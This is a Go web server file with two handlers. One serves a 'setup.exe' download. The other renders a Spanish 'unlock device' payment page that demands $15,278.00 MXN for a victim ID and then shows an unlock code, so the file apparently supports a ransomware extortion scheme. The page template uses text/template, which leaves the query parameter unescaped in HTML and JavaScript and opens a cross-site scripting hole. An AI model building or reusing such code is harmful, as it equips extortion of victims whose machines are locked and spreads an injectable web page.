package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"text/template"
)

// /app/download

func downloadFile(w http.ResponseWriter, r *http.Request) {
	// Ruta al archivo que quieres que se descargue
	filePath := "./setup.exe"

	// Abre el archivo
	file, err := os.Open(filePath)
	if err != nil {
		http.Error(w, "Archivo no encontrado.", http.StatusNotFound)
		return
	}
	defer file.Close()

	// Extrae el nombre del archivo
	fileName := filepath.Base(filePath)

	// Establece las cabeceras de la respuesta
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", fileName))
	w.Header().Set("Content-Type", "application/octet-stream")

	// Envía el archivo al cliente
	http.ServeFile(w, r, filePath)
}

// /app/payload

func payloadPage(w http.ResponseWriter, r *http.Request) {
	u, err := url.ParseRequestURI(r.RequestURI)
	if err != nil {
		http.Error(w, "Error parsing URL", http.StatusBadRequest)
		return
	}
	params := u.Query()
	v := params.Get("v")

	// Create a template and parse the HTML content
	tmpl := template.Must(template.New("page").Parse(`
		<!DOCTYPE html>
		<html>
		<head>
			<title>{{.Title}}</title>
		</head>
		<body>
			<h2>{{.Heading}}</h2>
			{{if .IsGet}}
				<form method="POST" action="/app/payload">
					<p>Monto: $15,278.00 mxn</p>
					<button type="submit">Pagar</button>
				</form>
			{{else}}
				<p>Su código es {{.Code}}</p>
				<button onclick="copiarAlPortapapeles()">Copiar</button>

				<script>
					function copiarAlPortapapeles() {
						// Crear un elemento de entrada temporal
						const elemento = document.createElement('textarea');
						elemento.value = "{{.Code}}";

						// Agregar el elemento al documento
						document.body.appendChild(elemento);

						// Seleccionar el texto del elemento
						elemento.select();
						elemento.setSelectionRange(0, 99999); // Para dispositivos móviles

						// Copiar el texto seleccionado
						document.execCommand('copy');

						// Remover el elemento del documento
						document.body.removeChild(elemento);
					}
				</script>
			{{end}}
		</body>
		</html>
	`))

	data := struct {
		Title   string
		Heading string
		IsGet   bool
		Code    string
	}{
		Title:   "Formulario para pagar",
		Heading: "Desbloquear equipo " + v,
		IsGet:   r.Method == "GET",
		Code:    v,
	}

	// Execute the template with the data and send the response
	if err := tmpl.Execute(w, data); err != nil {
		http.Error(w, "Error rendering template", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
}
